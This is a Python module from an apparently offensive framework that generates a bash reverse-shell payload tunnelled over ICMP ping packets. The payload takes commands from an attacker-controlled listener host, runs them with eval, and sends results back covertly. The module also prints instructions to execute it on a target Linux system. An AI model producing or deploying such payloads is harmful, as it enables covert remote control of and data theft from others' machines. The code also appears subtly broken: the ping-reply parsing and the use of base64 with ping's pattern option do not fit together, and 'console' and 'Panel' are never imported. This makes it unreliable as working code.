# /root/lazy1/modules/payloads/reverse/network/icmp_reverse.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "ICMP Reverse Shell",
    "description": "ICMP-based reverse shell using ping packets for covert communication",
    "author": "LazyFramework Team",
    "license": "MIT",
    "platform": "Linux",
    "arch": "x86/x64",
    "rank": "Normal",
    "dependencies": []
}

OPTIONS = {
    "lhost": {
        "description": "Listener IP address",
        "required": True,
        "default": "192.168.1.100"
    },
    "delay": {
        "description": "Delay between packets (seconds)",
        "required": False,
        "default": "2"
    }
}

def generate_icmp_reverse(lhost, delay="2"):
    """Generate ICMP reverse shell"""
    
    return f"bash -c 'while true; do data=$(ping -c 1 {lhost} 2>/dev/null | grep \"bytes from\" | cut -d\" \" -f1); if [ ! -z \"$data\" ]; then cmd=$(echo \"$data\" | base64 -d 2>/dev/null); if [ ! -z \"$cmd\" ]; then result=$(eval \"$cmd\" 2>&1 | base64 -w0); ping -c 1 -p \"$result\" {lhost} >/dev/null 2>&1; fi; fi; sleep {delay}; done'"

def run(session, options):
    lhost = options.get("lhost", "192.168.1.100")
    delay = options.get("delay", "2")
    
    console.print("\n[bold green]🛜 ICMP Reverse Shell[/bold green]")
    console.print("=" * 50)
    
    payload = generate_icmp_reverse(lhost, delay)
    
    console.print(f"\n[bold]Protocol:[/bold] ICMP (Ping)")
    console.print(f"[bold]Listener:[/bold] {lhost}")
    console.print(f"[bold]Delay:[/bold] {delay} seconds")
    console.print(f"[bold]Use Case:[/bold] Covert channel through ICMP")
    
    console.print(f"\n[bold yellow]📦 Payload:[/bold yellow]")
    console.print(Panel(payload, border_style="cyan"))
    
    console.print(f"\n[bold green]🚀 Usage:[/bold green]")
    console.print("1. Requires custom ICMP listener on attacker")
    console.print("2. Execute payload on target Linux system")
    console.print("3. Commands are embedded in ICMP packets")
    
    console.print(f"\n[bold red]⚠️  Note:[/bold red] Requires root privileges and custom listener")
    
    return payload
